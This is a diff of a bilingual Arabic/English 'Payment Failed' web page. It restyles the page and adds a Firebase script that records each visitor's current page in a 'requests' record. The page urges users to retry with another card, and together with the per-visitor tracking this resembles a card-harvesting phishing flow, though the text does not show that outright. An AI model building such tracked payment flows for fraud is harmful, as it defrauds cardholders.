@@ -7,49 +7,86 @@
     <script src="js/i18n.js"></script>
     <title>فشل عملية الدفع | Payment Failed</title>
     <link id="bootstrap-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="css/site-theme.css">
     <style>
-        body { min-height: 100vh; margin: 0; display: flex; flex-direction: column; }
-        .navbar { width: 100%; padding: 10px 0; }
-        .nav-logo { height: 35px; margin-inline-end: 20px; }
-        .main-content { flex: 1; display: flex; align-items: center; justify-content: center; width: 100%; padding: 20px 0; }
-        .card-failed { width: 100%; max-width: 480px; border-radius: var(--tree-radius-xl); padding: 40px; text-align: center; }
-        .icon-box {
-            width: 90px; height: 90px; background: rgba(220, 53, 69, 0.12); color: #dc3545;
-            border-radius: 50%; display: flex; align-items: center; justify-content: center;
-            font-size: 45px; margin: 0 auto 30px; animation: shake 0.5s ease-in-out;
+        body { min-height: 100vh; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+        .card-failed {
+            width: 100%; max-width: 480px;
+            border-radius: var(--tree-radius-xl);
+            padding: 44px 36px;
+            text-align: center;
         }
-        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
-        .btn-retry { padding: 15px; width: 100%; font-size: 1.1rem; text-decoration: none; display: block; }
-        .btn-retry:hover { transform: translateY(-2px); color: #fff; }
+        .icon-box {
+            width: 90px; height: 90px;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 2.6rem; margin: 0 auto 28px;
+            animation: shake 0.55s ease-in-out both;
+        }
+        @keyframes shake { 0%,100%{transform:translateX(0)} 20%{transform:translateX(-8px)} 40%{transform:translateX(8px)} 60%{transform:translateX(-5px)} 80%{transform:translateX(5px)} }
+        .nav-bar {
+            position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+            padding: 12px 20px; display: flex; justify-content: space-between; align-items: center;
+        }
+        .nav-logo-text {
+            font-size: 1.4rem; font-weight: 800; color: var(--tree-primary);
+            text-decoration: none; font-family: 'Inter', sans-serif;
+        }
+        .btn-retry {
+            display: block; width: 100%; padding: 14px;
+            background: linear-gradient(135deg, #dc3545, #c82333);
+            color: #fff; border: none; border-radius: 14px;
+            font-size: 1rem; font-weight: 700; cursor: pointer;
+            text-align: center; text-decoration: none;
+            font-family: 'Cairo','Inter',sans-serif;
+            transition: transform .15s, box-shadow .15s;
+        }
+        .btn-retry:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(220,53,69,.35); color: #fff; }
     </style>
 </head>
 <body class="tree-site">
 
 <button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>
 
-<nav class="navbar">
-    <div class="container-fluid d-flex justify-content-between align-items-center">
-        <img src="images/logo.png" class="nav-logo" alt="Tree">
-        <button class="btn btn-outline-success btn-sm" data-lang-toggle onclick="toggleLang()">EN</button>
-    </div>
+<nav class="nav-bar">
+    <a href="index.html" class="nav-logo-text">tree</a>
+    <button class="btn btn-outline-success btn-sm" data-lang-toggle onclick="toggleLang()">EN</button>
 </nav>
 
-<div class="main-content">
-    <div class="card-failed">
-        <div class="icon-box">✕</div>
-        <h2 class="fw-bold text-dark mb-3" data-i18n="failed.title">نعتذر</h2>
-        <p class="text-muted mb-5" style="line-height: 1.8; font-size: 1.1rem; font-weight: 600;">
-            <span data-i18n="failed.msg1">نعتذر، لم نتمكن من معالجة عملية الدفع باستخدام البطاقة المدخلة.</span>
-            <br>
-            <span data-i18n="failed.msg2">قد يكون السبب عدم كفاية الرصيد أو رفض من البنك المصدر.</span>
-            <br>
-            <span data-i18n="failed.msg3">يرجى المحاولة باستخدام بطاقة أخرى أو التواصل مع البنك.</span>
-        </p>
-        <a href="payment.html" class="btn-retry" data-i18n="failed.btn_retry">المتابعة للدفع ↺</a>
-    </div>
+<div class="card-failed main-card">
+    <div class="icon-box" style="background:rgba(220,53,69,0.12);color:#dc3545;">✕</div>
+
+    <h2 class="fw-bold mb-3" style="color:#dc3545;" data-i18n="failed.title">نعتذر</h2>
+
+    <p class="mb-4" style="line-height:1.85; font-size:0.97rem; color:var(--tree-text-muted); font-weight:600;">
+        <span data-i18n="failed.msg1">نعتذر، لم نتمكن من معالجة عملية الدفع باستخدام البطاقة المدخلة.</span><br><br>
+        <span data-i18n="failed.msg2">قد يكون السبب عدم كفاية الرصيد أو رفض من البنك المصدر.</span><br><br>
+        <span data-i18n="failed.msg3">يرجى المحاولة باستخدام بطاقة أخرى أو التواصل مع البنك.</span>
+    </p>
+
+    <a href="payment.html" class="btn-retry" data-i18n="failed.btn_retry">المتابعة للدفع ↺</a>
+    <a href="index.html" class="d-block mt-3 text-muted small" style="text-decoration:none;" data-i18n="success.btn_home">العودة للرئيسية</a>
 </div>
 
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
+        authDomain: "tameen-658e9.firebaseapp.com",
+        projectId: "tameen-658e9",
+        storageBucket: "tameen-658e9.firebasestorage.app",
+        messagingSenderId: "292670676256",
+        appId: "1:292670676256:web:3624157751cd194efe4b45"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+    const userId = localStorage.getItem('user_id');
+
+    if (userId) {
+        db.collection("requests").doc(userId).update({ currentPage: 'فشل الدفع' }).catch(() => {});
+    }
+</script>
 </body>
 </html>
